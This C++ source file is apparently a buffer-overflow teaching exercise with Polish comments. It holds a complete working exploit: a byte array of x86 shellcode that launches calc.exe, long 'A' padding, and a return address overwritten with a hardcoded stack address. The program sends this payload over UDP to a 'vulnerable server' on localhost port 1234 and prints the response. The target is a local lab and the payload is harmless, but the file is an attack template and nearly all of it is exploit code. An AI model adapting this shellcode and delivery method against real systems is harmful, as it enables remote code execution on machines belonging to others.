// Exploit01.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "winsock2.h"
#include "time.h"

#define VULNERABLE_SERVER_PORT	1234

struct sockaddr_in serverAddr; 
int s;

int InitWSA();
int SocketInitialization();

char exploit01[] = {'M', 'D', '5', '$', 'A',
0xbc, 0x00, 0xfa, 0x19, 0x00,
0x68, 0x9e, 0xfa,0x19,0x00,
0xbb, 0x78, 0x9f, 0x44, 0x00,
0xff, 0xd3,
'c', 'a', 'l', 'c', '.', 'e', 'x', 'e', 0x00, 
'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A',
'A', 'A', 0x8C, 0xFA, 0x19, 0x00, 
'$', 0x00};


int main(int argc, char* argv[])
{
 int result;
 int randomNumber;
 char buffer[1024];
 UINT (*func)(char*,UINT);
 HANDLE handle;

 InitWSA();
 
 s=SocketInitialization();

  //wyœlij dane ...
 result=sendto(s,exploit01,sizeof(exploit01),0,(SOCKADDR*)&serverAddr,sizeof(serverAddr));

 // ... i zobacz co otrzyma³eœ w odpowiedzi
 result=recv(s,buffer,sizeof(buffer),0);

 printf("%s\n",buffer);

 return 0;
}

int InitWSA()
{
 int err,winsock_version;
 WSADATA winsock_data;

 winsock_version = MAKEWORD (2, 2);
 err = WSAStartup (winsock_version, &winsock_data);
 if (err != 0)
    return -1;
 return 0;
}

int SocketInitialization()
{
 struct sockaddr_in clientAddr; 
 int s,length;
 int result;

 memset((char*)&clientAddr,0,sizeof(clientAddr));
 clientAddr.sin_family=AF_INET;
 clientAddr.sin_addr.s_addr=INADDR_ANY;
 clientAddr.sin_port=htons(0); 

 memset((char*)&serverAddr,0,sizeof(serverAddr));
 serverAddr.sin_family=AF_INET;
 serverAddr.sin_addr.s_addr=inet_addr("127.0.0.1");
 serverAddr.sin_port=htons(VULNERABLE_SERVER_PORT);

 s=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
 
 if (s<0)
	{
     printf("Socket creating failed\n");
     return -1;
   }

   if(bind(s,(LPSOCKADDR)&clientAddr,sizeof(struct sockaddr_in))<0)
	{
     printf("Bind failed\n");
     return -1;
   }

 return s;
}